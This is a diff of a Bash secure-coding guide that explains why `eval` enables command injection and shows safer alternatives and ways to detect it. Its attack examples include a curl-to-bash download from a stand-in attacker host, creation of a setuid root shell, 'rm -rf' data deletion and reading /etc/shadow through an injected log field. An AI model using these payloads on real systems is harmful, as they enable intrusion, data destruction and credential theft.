@@ -1,204 +1,130 @@
 ## Eval Command
 
-**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary.**
+**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary—better alternatives exist for almost all use cases.**
 
 **Rationale:**
-- **Code Injection**: `eval` executes arbitrary code with full script privileges—no sandboxing
-- **Bypasses All Validation**: Sanitized input can still contain metacharacters enabling injection
-- **Difficult to Audit**: Dynamic code construction prevents security review
-- **Better Alternatives Exist**: Arrays, indirect expansion, and associative arrays cover nearly all use cases
+- **Code Injection**: `eval` executes arbitrary code with full script privileges (file access, network, commands)
+- **Bypasses Validation**: Even sanitized input can contain metacharacters enabling injection
+- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
+- **Better Alternatives**: Arrays, indirect expansion, and associative arrays handle nearly all use cases safely
 
 **Understanding eval:**
 
-`eval` performs all expansions on a string, then executes the result—double expansion is the danger:
+`eval` takes a string, performs all expansions, then executes the result—performing expansion TWICE:
 
 ```bash
 var='$(whoami)'
-eval "echo $var"  # First: echo $(whoami) �' Second: executes whoami!
+eval "echo $var"  # First expansion: echo $(whoami)
+                   # Second expansion: executes whoami command!
 ```
 
-**Attack Example 1: Direct Command Injection**
+**Attack Examples:**
 
 ```bash
-# VULNERABLE - user_input executed directly
+# Attack 1: Direct Command Injection
 eval "$user_input"
-```
+# Attacker: 'curl https://attacker.com/backdoor.sh | bash'
 
-**Attack:**
-```bash
-./script.sh 'curl https://attacker.com/backdoor.sh | bash'
-./script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
-```
-
-**Attack Example 2: Variable Name Injection**
-
-```bash
-# VULNERABLE - seems safe but isn't
+# Attack 2: Variable Name Injection
 eval "$var_name='$var_value'"
+# Attacker var_name: 'x=$(rm -rf /important/data)'
+# Executes command substitution!
+
+# Attack 3: Log Injection
+eval "echo \"$timestamp - Event: $event\" >> /var/log/app.log"
+# Attacker event: 'login"; cat /etc/shadow > /tmp/pwned; echo "'
 ```
 
-**Attack:**
-```bash
-./script.sh 'x=$(rm -rf /important/data)' 'ignored'
-# Executes: x=$(rm -rf /important/data)='ignored'
-```
-
-**Attack Example 3: Log Injection**
+**Safe Alternatives:**
 
 ```bash
-# VULNERABLE logging function
-log_event() {
-  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
-  eval "$log_template"
-}
-```
+# Alternative 1: Arrays for Command Construction
+cmd=(find "$search_path" -type f -name "$file_pattern")
+"${cmd[@]}"  # Array preserves exact arguments, no injection
 
-**Attack:**
-```bash
-./script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'
-# Executes three commands including the malicious cat
-```
+# Alternative 2: Indirect Expansion for Variable References
+# ✗ eval "value=\\$$var_name"
+# ✓ echo "${!var_name}"
+# ✓ printf -v "$var_name" '%s' "$value"  # Safe assignment
 
-**Safe Alternative 1: Arrays for Command Construction**
+# Alternative 3: Associative Arrays for Dynamic Data
+# ✗ eval "var_$i='value $i'"
+# ✓ declare -A data; data["var_$i"]="value $i"
 
-```bash
-# ✓ Correct - no eval needed
-build_find_command() {
-  local -a cmd=(find "$search_path" -type f -name "$file_pattern")
-  "${cmd[@]}"
-}
-```
+# Alternative 4: Case/Arrays for Function Dispatch
+# ✗ eval "${action}_function"
+# ✓ case "$action" in
+#     start) start_function ;; stop) stop_function ;;
+#     *) die 22 "Invalid action ${action@Q}" ;;
+#   esac
+# ✓ declare -A actions=([start]=start_function [stop]=stop_function)
+#   [[ -v "actions[$action]" ]] && "${actions[$action]}"
 
-**Safe Alternative 2: Indirect Expansion for Variable References**
+# Alternative 5: Direct Command Substitution
+# ✗ eval "output=\\$($cmd)"
+# ✓ declare -a cmd=(ls -la /tmp); output=$("${cmd[@]}")
 
-```bash
-# ✗ Wrong
-eval "value=\\$$var_name"
+# Alternative 6: Read for Parsing key=value
+# ✗ eval "$config_line"
+# ✓ IFS='=' read -r key value <<< "$config_line"
+#   [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]] && declare -g "$key=$value"
 
-# ✓ Correct - read variable
-echo "${!var_name}"
-
-# ✓ Correct - assign variable
-printf -v "$var_name" '%s' "$value"
-```
-
-**Safe Alternative 3: Associative Arrays for Dynamic Data**
-
-```bash
-# ✗ Wrong
-for i in {1..5}; do
-  eval "var_$i='value $i'"
-done
-
-# ✓ Correct
-declare -A data
-for i in {1..5}; do
-  data["var_$i"]="value $i"
-done
-echo "${data[var_3]}"
-```
-
-**Safe Alternative 4: Case/Arrays for Function Dispatch**
-
-```bash
-# ✗ Wrong
-eval "${action}_function"
-
-# ✓ Correct - case statement
-case "$action" in
-  start)   start_function ;;
-  stop)    stop_function ;;
-  *)       die 22 "Invalid action ${action@Q}" ;;
-esac
-
-# ✓ Correct - associative array
-declare -A actions=([start]=start_function [stop]=stop_function)
-if [[ -v "actions[$action]" ]]; then
-  "${actions[$action]}"
-fi
-```
-
-**Safe Alternative 5: Direct Command Substitution**
-
-```bash
-# ✗ Wrong
-eval "output=\$($cmd)"
-
-# ✓ Correct - array
-declare -a cmd=(ls -la /tmp)
-output=$("${cmd[@]}")
-```
-
-**Safe Alternative 6: Validated Parsing**
-
-```bash
-# ✗ Wrong
-eval "$config_line"  # PORT=8080
-
-# ✓ Correct - validate key before assignment
-IFS='=' read -r key value <<< "$config_line"
-if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
-  declare -g "$key=$value"
-fi
+# Alternative 7: Arithmetic Expansion
+# ✗ eval "result=$((user_expr))"
+# ✓ [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]] && result=$((user_expr))
+# ✓ result=$(bc <<< "$user_expr")  # Isolates operations
 ```
 
 **Edge Cases:**
 
-**Dynamic variable names in loops:**
 ```bash
-# Use associative array instead
-declare -A service_status
-for service in nginx apache mysql; do
-  service_status["$service"]=$(systemctl is-active "$service")
-done
-```
+# Dynamic variables in loops
+# ✗ eval "${service}_status=\\$(systemctl is-active $service)"
+# ✓ declare -A service_status
+#   service_status["$service"]=$(systemctl is-active "$service")
 
-**Building complex commands:**
-```bash
-# ✗ Wrong - string concatenation with eval
-cmd="find /data -type f"
-[[ -n "$pattern" ]] && cmd="$cmd -name '$pattern'"
-eval "$cmd"
+# Building complex commands with options
+# ✗ cmd="find /data -type f"; cmd="$cmd -name '$pattern'"; eval "$cmd"
+# ✓ declare -a cmd=(find /data -type f)
+#   [[ -n "$pattern" ]] && cmd+=(-name "$pattern")
+#   "${cmd[@]}"
 
-# ✓ Correct - array
-declare -a cmd=(find /data -type f)
-[[ -n "$pattern" ]] && cmd+=(-name "$pattern")
-"${cmd[@]}"
+# Sourcing config with variable expansion
+# ✓ source config.txt  # Bash expands variables directly
+# ✓ Better: validate first
+if grep -qE '(eval|exec|`|\$\()' config.txt; then
+  die 1 'Config file contains dangerous patterns'
+fi
+source config.txt
 ```
 
 **Anti-patterns:**
 
 ```bash
-# ✗ eval with user input �' ✓ whitelist with case
-eval "$user_command"
-case "$user_command" in
-  start|stop) systemctl "$user_command" myapp ;;
-esac
+# ✗ eval "$user_command"
+# ✓ case "$user_command" in start|stop|restart) systemctl "$user_command" myapp ;; esac
 
-# ✗ eval for variable assignment �' ✓ printf -v
-eval "$var_name='$var_value'"
-printf -v "$var_name" '%s' "$var_value"
+# ✗ eval "$var_name='$var_value'"
+# ✓ printf -v "$var_name" '%s' "$var_value"
 
-# ✗ eval to check if variable set �' ✓ -v test
-eval "if [[ -n \\$$var_name ]]; then echo set; fi"
-if [[ -v "$var_name" ]]; then echo set; fi
+# ✗ eval "if [[ -n \\$$var_name ]]; then echo set; fi"
+# ✓ [[ -v "$var_name" ]] && echo set
 
-# ✗ double expansion �' ✓ indirect expansion
-eval "echo \$$var_name"
-echo "${!var_name}"
+# ✗ eval "echo \\$$var_name"
+# ✓ echo "${!var_name}"
 ```
 
 **Detecting eval usage:**
 
 ```bash
-grep -rn 'eval.*\$' /path/to/scripts/  # Find dangerous eval
+grep -rn 'eval.*\$' /path/to/scripts/  # eval with variables (very dangerous)
 shellcheck -x script.sh                 # SC2086 warns about eval
 ```
 
 **Summary:**
 - **Never use eval with untrusted input**—no exceptions
 - **Use arrays** for dynamic commands: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
-- **Use indirect expansion**: `${!var_name}`
+- **Use indirect expansion**: `echo "${!var_name}"`
 - **Use associative arrays**: `declare -A data; data[$key]=$value`
 - **Use case/arrays** for function dispatch
 - **Key principle:** If you think you need `eval`, you're solving the wrong problem
